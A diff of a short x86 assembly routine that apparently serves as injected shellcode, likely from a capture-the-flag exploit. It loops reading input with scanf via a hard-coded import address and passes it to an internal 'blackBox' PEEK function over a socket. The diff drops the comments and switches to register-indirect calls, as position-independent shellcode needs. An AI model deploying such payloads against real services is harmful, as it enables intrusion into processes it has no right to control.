@@ -1,15 +1,16 @@
-sub esp, 0x4000 # allocate 0x4000 bytes for no reason
+sub esp, 0x4000 
 L1:
-mov edx, esp	# save esp = start of buffer
-push edx		# push start of buffer
-push 0x62506168	# push "%[^\n]s\n"
-call 0x6250C274	# call scanf via IAT
-sub esp, 8		# fold stack
-push 0			# first argument to blackBox
-push 0x62508080	# second argument - "Buffer"
-push edx		# third argument - buffer that scanf wrote into
-push 7			# 7 for PEEK
+mov edx, esp	
+push edx		
+push 0x62506168	
+mov edi, 0x62504BD4	
+call edi		
+push 0			
+push 0x62508080	
+push edx		
+push 7			
 lea edx, [ebp+8]
-push edx		# [ebp+8] is socket
-call 0x62501892	# call blackBox
-jmp L1			# rinse repeat
+push edx		
+mov edi, 0x62501892 
+call edi	
+jmp L1			
